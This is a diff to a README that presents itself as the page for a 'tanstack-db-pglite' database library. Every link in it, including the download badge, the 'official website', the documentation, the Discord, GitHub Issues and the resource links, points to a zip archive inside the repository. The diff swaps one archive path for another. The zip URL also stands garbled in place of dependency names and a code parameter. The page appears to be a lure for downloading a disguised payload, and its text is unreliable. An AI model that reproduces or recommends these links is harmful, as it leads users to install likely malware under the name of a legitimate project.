@@ -1,12 +1,12 @@
 # 🚀 tanstack-db-pglite - Seamless Database Management for Everyone
 
-[![Download tanstack-db-pglite](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
+[![Download tanstack-db-pglite](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
 
 ## 📥 Download & Install
 
 To get started with tanstack-db-pglite, visit the releases page to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
+[Visit this page to download](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
 
 ## ⚙️ What is tanstack-db-pglite?
 
@@ -15,7 +15,7 @@ tanstack-db-pglite provides an easy way to manage databases on your browser. It 
 ## 💻 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip Version 14.x or later
+- https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip Version 14.x or later
 - Browser: Latest version of Chrome, Firefox, or Safari
 
 ## 🛠️ Features
@@ -29,9 +29,9 @@ tanstack-db-pglite provides an easy way to manage databases on your browser. It 
 
 Follow these steps to set up tanstack-db-pglite on your machine:
 
-### Step 1: Install https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip
+### Step 1: Install https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip
 
-If you haven't installed https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip yet, download it from the [https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip official website](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip).
+If you haven't installed https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip yet, download it from the [https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip official website](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip).
 
 ### Step 2: Install tanstack-db-pglite
 
@@ -60,7 +60,7 @@ const db = drizzle(pglite)
 export const chatsCollection = createCollection(drizzleCollectionOptions({
   db,
   table: chats,
-  primaryColumn: https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip,
+  primaryColumn: https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip,
   prepare: async () => {
     // Prepare your database before starting the collection (e.g., run migrations)
     await waitForMigrati
@@ -74,13 +74,13 @@ This code snippet shows how to initialize and prepare your database using tansta
 
 For more detailed instructions and advanced features, check our comprehensive documentation:
 
-[Read the full documentation](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
+[Read the full documentation](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
 
 ## 🐞 Troubleshooting
 
 If you encounter issues, try the following steps:
 
-1. Ensure that https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip is properly installed.
+1. Ensure that https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip is properly installed.
 2. Check for any missing package installations.
 3. Review any error messages you receive in the terminal.
 
@@ -88,14 +88,14 @@ If you encounter issues, try the following steps:
 
 Join our community for support, tips, and discussions:
 
-- [GitHub Issues](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
-- [Discord Channel](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
+- [GitHub Issues](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
+- [Discord Channel](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
 
 ## 🔗 Resources
 
-- [TanStack DB Website](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
-- [PGLite GitHub Repository](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
-- [Drizzle ORM Documentation](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
+- [TanStack DB Website](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
+- [PGLite GitHub Repository](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
+- [Drizzle ORM Documentation](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
 
 ## ⚙️ Contributing
 
@@ -113,6 +113,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Don't forget, to get the latest version of tanstack-db-pglite, please visit:
 
-[Visit this page to download](https://raw.githubusercontent.com/maria-queen315/tanstack-db-pglite/main/colalgia/tanstack-db-pglite.zip)
+[Visit this page to download](https://github.com/maria-queen315/tanstack-db-pglite/raw/refs/heads/main/src/tanstack_pglite_db_2.2.zip)
 
 Your journey with tanstack-db-pglite starts here. Enjoy a smooth and efficient database management experience!
